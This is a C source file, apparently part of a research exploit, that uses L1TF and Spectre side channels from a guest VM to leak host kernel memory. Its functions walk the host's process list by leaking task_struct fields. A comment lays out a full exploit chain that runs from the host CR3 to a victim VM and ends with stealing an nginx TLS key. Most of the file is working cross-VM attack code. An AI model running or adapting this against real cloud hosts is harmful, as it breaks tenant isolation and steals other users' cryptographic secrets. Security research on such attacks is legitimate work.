#include <assert.h>
#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include "constants.h"
#include "helpers.h"
#include "hypercall.h"
#include "l1tf.h"
#include "spectre.h"
#include "util.h"
#include "timing.h"
#include "reverse.h"
#include "benchmark.h"
#include "config.h"

#define direct_map 0xffff934040000000

uintptr_t pa(uintptr_t va) {
	uintptr_t p = va - direct_map;
	assert(p < (1ULL << 40));
	return p;
}

int in_direct_map(uintptr_t va)
{
	return (va >> 40) == (direct_map >> 40);
}

uintptr_t leak_task_struct(uintptr_t base, uintptr_t task_struct)
{
	const int verbose = 1;
	// char prios[0xc];
	// l1tf_leak(prios, base, pa(task_struct+OFF_PRIOS), sizeof(prios), repeats);
	// printf("prios:\n"); display(prios, sizeof(prios));

	char comm[0x10];
	l1tf_leak(comm, base, pa(task_struct+H_TASK_COMM), sizeof(comm));
	printf("comm:\n"); display(comm, sizeof(comm));

	printf("task_struct %16lx | comm ", task_struct);
	for (unsigned long i = 0; i < sizeof(comm); i++)
		printf("%c", isprint(comm[i]) ? comm[i] : '.');
	printf("\n");

	uintptr_t tasks_next = 0, tasks_prev = 0;
	do {
		l1tf_leak((char *)&tasks_next, base, pa(task_struct+H_TASK_TASKS), sizeof(tasks_next));
		if (in_direct_map(tasks_next))
			l1tf_leak((char *)&tasks_prev, base, pa(tasks_next+8), sizeof(tasks_prev));
		else
			tasks_prev = -1;
		if (verbose) printf("tasks_next %16lx,  tasks_prev %16lx (expected: %16lx)\n", tasks_next, tasks_prev, task_struct+H_TASK_TASKS);
	} while (tasks_prev != task_struct+H_TASK_TASKS);

	uintptr_t next_task_struct = tasks_next - H_TASK_TASKS;
	return next_task_struct;
}

uintptr_t leak_task_struct_backward(uintptr_t base, uintptr_t task_struct)
{
	const int verbose = 1;

	char comm[0x10];
	l1tf_leak(comm, base, pa(task_struct+H_TASK_COMM), sizeof(comm));
	printf("comm:\n"); display(comm, sizeof(comm));

	printf("task_struct %16lx | comm ", task_struct);
	for (unsigned long i = 0; i < sizeof(comm); i++)
		printf("%c", isprint(comm[i]) ? comm[i] : '.');
	printf("\n");

	uintptr_t tasks_prev = 0, tasks_next = 0;
	do {
		l1tf_leak((char *)&tasks_prev, base, pa(task_struct+H_TASK_TASKS+8), sizeof(tasks_prev));
		if (in_direct_map(tasks_prev))
			l1tf_leak((char *)&tasks_next, base, pa(tasks_prev), sizeof(tasks_next));
		else
			tasks_next = -1;
		if (verbose) printf("tasks_prev %16lx,  tasks_next %16lx (expected: %16lx)\n", tasks_prev, tasks_next, task_struct+H_TASK_TASKS);
	} while (tasks_next != task_struct+H_TASK_TASKS);

	uintptr_t prev_task_struct = tasks_prev - H_TASK_TASKS;
	return prev_task_struct;
}

void leak_process_list(hpa_t base, hva_t own_task_struct)
{
	// leak_task_struct(base, own_task_struct, 9);
	// uintptr_t task_prev = 0xffff93416c014a80-H_TASK_TASKS;
	// leak_task_struct(base, task_prev, 9);
	// uintptr_t task_prev_next = 0xffff934214810a40-H_TASK_TASKS;
	// leak_task_struct(base, task_prev_next, 9);
	// uintptr_t task_prev_prev = 0xffff93a1c66b2a80-H_TASK_TASKS;
	// leak_task_struct(base, task_prev_prev, 9);

	uintptr_t first_task_struct = 0xffff93416c014a80-H_TASK_TASKS;
	uintptr_t task_struct = first_task_struct;
	do {
		// task_struct = leak_task_struct(base, task_struct);
		task_struct = leak_task_struct_backward(base, task_struct);
	} while (task_struct != first_task_struct);
}

void config_print(void)
{
	printf("========[CONFIG]========\n");
	printf("MACHINE: %11s (%d)\n", MACHINE_STR, MACHINE);
	printf("HELPERS: %11s (%d)\n", HELPERS ? "YES" : "NO", HELPERS);
	printf("LEAK:    %11s (%d)\n", LEAK_STR, LEAK);
	printf("========================\n\n");
}

/* Exploit Chain
 * =============
 *
 * Our goals are the following:
 * - Find host's direct map: map -> lapic; brute force lapic's pa.
 * - Leak host's CR3: lapic -> vcpu -> pid -> task -> mm.
 * - Find victim VM: vcpu -> kvm -{vm_list}-> kvm -> vcpu_array -> vcpu.
 * - Leak guest's CR3: vcpu -> arch -> mmu -> info.
 * - Find guest's kernel text: read from page tables.
 * - Find nginx: text -> init -{tasks,comm}-> nginx.
 * - Find nginx's heap: ?
 * - Leak TSL key: constant offset.
 */

int main(void)
{
	config_print();
	srand(time(0));
	set_cpu_affinity(CPU);
	l1tf_init();
	uintptr_t base = l1tf_find_base();

	reverse_host_kernel_data_structures();
	exit(0);



	return 0;
}
